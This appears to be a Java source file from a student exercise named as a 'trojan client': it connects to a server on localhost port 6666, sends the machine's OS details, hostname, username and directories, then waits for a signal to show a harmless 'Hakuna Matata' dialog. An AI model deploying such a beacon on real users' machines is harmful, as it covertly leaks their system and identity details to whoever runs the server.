/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package com.cafeconpalito.psp_tema3_troyano_cliente;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.InetAddress;
import java.net.Socket;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JDialog;
import javax.swing.JOptionPane;

/**
 *
 * @author damt207
 */
public class HiloCliente implements Runnable {

    Socket Server = null;
    String ipServer = "localhost";
    int puertoServer = 6666;

    @Override
    public void run() {

        DataInputStream bufferDatosEntrada = null;
        DataOutputStream bufferDatosSalida = null;

        try {

            Server = new Socket(ipServer, puertoServer);

            bufferDatosEntrada = new DataInputStream(Server.getInputStream());
            bufferDatosSalida = new DataOutputStream(Server.getOutputStream());

            Server.setSoLinger(true, 10);

            String sSistemaOpera5vo = System.getProperty("os.name");
            InetAddress localHost = InetAddress.getLocalHost();
            String usuario = System.getProperty("user.name");
            String arquitecturaSO = System.getProperty("os.arch");
            String versionSO = System.getProperty("os.version");
            String currentDIR = System.getProperty("user.dir");
            String userHome = System.getProperty("user.home");

            bufferDatosSalida.writeUTF(sSistemaOpera5vo + "\n"
                    + localHost + "\n"
                    + usuario + "\n"
                    + arquitecturaSO + "\n"
                    + versionSO + "\n"
                    + currentDIR + "\n"
                    + userHome + "\n"
            );

            do {
                System.out.println("entro en el bucle esperando boleando de mensaje");
                boolean mensaje = bufferDatosEntrada.readBoolean();
                System.out.println("llego mensaje");
                if (mensaje) {
                    System.out.println("Entro en el Boleando");
                    JOptionPane jop = new JOptionPane("¡Hakuna Matata!\n¿Cómo puedes estar triste si la filosofía es 'sin preocupaciones?", JOptionPane.INFORMATION_MESSAGE);
                    JDialog jd = jop.createDialog("Hakuna Matata");
                    jd.setLocationRelativeTo(null);
                    jd.setVisible(true);
                }

            } while (true);

        } catch (IOException ex) {
            Logger.getLogger(HiloCliente.class.getName()).log(Level.SEVERE, null, ex);
        } finally {

            try {

                //Cerrando los flujos
                if (bufferDatosEntrada != null) {
                    bufferDatosEntrada.close();
                }
                if (bufferDatosSalida != null) {
                    bufferDatosSalida.close();
                }
                //Cerrando cliente
                if (Server != null) {
                    Server.close();
                }
            } catch (IOException ex) {
                Logger.getLogger(HiloCliente.class.getName()).log(Level.SEVERE, null, ex);
            }
        }

    }

}
